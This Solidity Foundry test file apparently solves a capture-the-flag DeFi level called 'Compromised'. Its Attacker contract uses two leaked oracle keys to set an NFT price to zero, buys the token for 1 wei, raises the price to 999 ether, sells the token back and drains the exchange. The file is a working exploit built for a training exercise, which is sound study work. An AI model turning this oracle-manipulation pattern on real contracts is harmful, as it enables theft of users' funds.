// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/compromised/CompromisedLevel.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";


interface ITrustfulOracle {
  function postPrice(string calldata, uint256) external;
}

interface IExchange {
  function buyOne() external payable returns (uint256);
  function sellOne(uint256) external;
}

contract Attacker is IERC721Receiver {
  ITrustfulOracle oracle;
  IExchange exchange;
  IERC721 token;
  uint256 tokenId;

  constructor(CompromisedLevel level) payable {
    oracle = ITrustfulOracle(address(level.oracle()));
    exchange = IExchange(address(level.exchange()));
    token = IERC721(address(level.nftToken()));
  }

  function attack(Vm vm) public {
    // we got the private keys from the intercepted message
    // IRL we use a script with the given keys instead of `vm.startPrank()`
    vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    // this function will call onERC721Received() below
    exchange.buyOne{value: 1 wei}();

    // returning to the price it was, so we can drain the exchange
    vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
    oracle.postPrice("DVNFT", 999000000000000000000);
    vm.stopPrank();

    vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
    oracle.postPrice("DVNFT", 999000000000000000000);
    vm.stopPrank();

    // let's sell this token
    token.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);

    // give the money to the player to beat the level
    (bool success,) = msg.sender.call{value: address(this).balance}("");
    success;
  }

  function onERC721Received(
      address,
      address,
      uint256 _tokenId,
      bytes calldata
  ) external override returns (bytes4) {
      // get the id of the minted token
      tokenId = _tokenId;
      return this.onERC721Received.selector;
  }

  receive() external payable {}
}

contract CompromisedTest is Test {
  CompromisedLevel level = new CompromisedLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    Attacker attacker = new Attacker{value: 1 wei}(level);
    attacker.attack(vm);
    level.validate();
  }

  // need to hold funds to beat the level
  receive() external payable {}
}
